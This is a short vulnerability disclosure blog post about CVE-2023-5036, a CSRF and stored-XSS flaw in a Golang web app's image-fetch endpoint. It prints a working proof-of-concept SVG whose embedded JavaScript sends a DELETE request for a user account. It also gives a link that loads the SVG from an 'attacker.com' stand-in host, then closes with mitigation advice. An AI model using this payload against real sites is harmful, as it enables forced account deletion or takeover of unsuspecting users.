---
title: CVE-2023-5036 - CSRF in Golang web app
date: 2023-09-18 20:19:47
tags: CVE
---

## What is a CSRF vulnerability?

CSRF (Cross-Site Request Forgery) is an attack that allows attackers to force authenticated users to make requests on their behalf. In other words, it allows a motivated adversary to force users to do things without their consent. The user may be forced to make an embarrassing social media post, or authorize a bank transaction without realizing. If you can perform CSRF on an admin user it even opens the ability for attackers to take down an entire application.

## Our problem

Often times, CSRF vulnerabilities when paired with another vulnerability such as cross-site scripting (XSS) can lead to disastrous outcomes. In this instance, the application in question had an endpoint which would fetch images that didn't have the proper validation in place to either prevent CSRF or XSS. Due to this, we were able to craft a malicious image that would make a request on behalf of the user that clicks our link.

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    fetch("http://server-name.com/api/v1/user/2", { method: "DELETE", headers: { "Origin": "server-name.com" } })
  </script>
</svg>
```

SVG files are considered valid images but in this case it also served as our attack vector. By injecting javascript into the image we can force an unsuspecting user who clicks on the following link to do anything from deleting their account to making an embarrassing post. 

```
https://server-name.com:5230/o/get/image?url=https://attacker.com/malicious.svg

```

Had we tricked an admin into clicking the above link, we would even be able to change the password if the password change form didn't require knowledge of the old password (which it didn't). The lack of authentication required to form the attack along with the non-trivial consequences of exploitation make this a rather critical vulnerability that should be patched immediately for those running this software. 

Part of me wishes that there were more to write about this exploit but the fact of the matter is that sometimes exploitation can be really easy. In this case there happened to be an endpoint that reaches out to an external URL which is always a manage concern when developing webapps. When making any API route that makes any sort of request based on a url parameter (whether it happens server side or client side) there should always be safeguards put in place. This could be a CSRF token which prevents clients' browsers from making requests to other sites, or input sanitization to prevent unwanted javascript from executing. There are certainly other measures you can put in place that might be more comprehensive while, but in my opinion santizing javascript out of an image is perfectly fine because I've yet to encounter an image with benign javascript embedded in it in the wild. Stay safe out there.
